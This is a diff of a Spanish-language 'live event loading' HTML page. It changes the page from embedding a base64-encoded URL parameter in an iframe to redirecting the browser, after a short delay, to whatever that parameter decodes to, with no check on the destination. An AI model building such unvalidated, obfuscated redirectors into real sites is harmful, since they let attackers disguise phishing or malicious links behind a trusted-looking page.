@@ -3,23 +3,19 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Evento en vivo</title>
+<title>Cargando evento...</title>
 
 <style>
-
 body{
 margin:0;
-background:#000;
-font-family:Arial;
-}
-
-#loader{
-position:absolute;
-top:50%;
-left:50%;
-transform:translate(-50%,-50%);
+background:#0f0f0f;
 color:white;
-text-align:center;
+font-family:Arial;
+display:flex;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+height:100vh;
 }
 
 .loader{
@@ -29,51 +25,41 @@ border-radius:50%;
 width:60px;
 height:60px;
 animation:spin 1s linear infinite;
-margin:20px auto;
+margin-top:20px;
 }
 
 @keyframes spin{
-0%{transform:rotate(0deg);}
-100%{transform:rotate(360deg);}
+0%{transform:rotate(0deg)}
+100%{transform:rotate(360deg)}
 }
-
-iframe{
-width:100%;
-height:100vh;
-border:none;
-display:none;
-}
-
 </style>
 </head>
 
 <body>
 
-<div id="loader">
 <h2>🎥 Cargando evento en vivo...</h2>
 <div class="loader"></div>
-</div>
-
-<iframe id="player" allowfullscreen allow="autoplay"></iframe>
 
 <script>
 
-var params = new URLSearchParams(window.location.search);
-var embed = params.get("r");
+const params = new URLSearchParams(window.location.search);
+let embed = params.get("r");
 
 if(embed){
 
-var decoded = atob(embed);
+let url = atob(embed);
 
-var iframe = document.getElementById("player");
+/* si la url no tiene http agregar https */
 
-setTimeout(function(){
+if(!url.startsWith("http")){
+url = "https://" + url.replace(/^\/+/,"");
+}
 
-iframe.src = decoded;
-iframe.style.display = "block";
-document.getElementById("loader").style.display = "none";
+/* redirigir */
 
-},1500);
+setTimeout(()=>{
+window.location.href = url;
+},1200);
 
 }
 
@@ -81,7 +67,6 @@ document.getElementById("loader").style.display = "none";
 
 </body>
 </html>
-
 
 
 
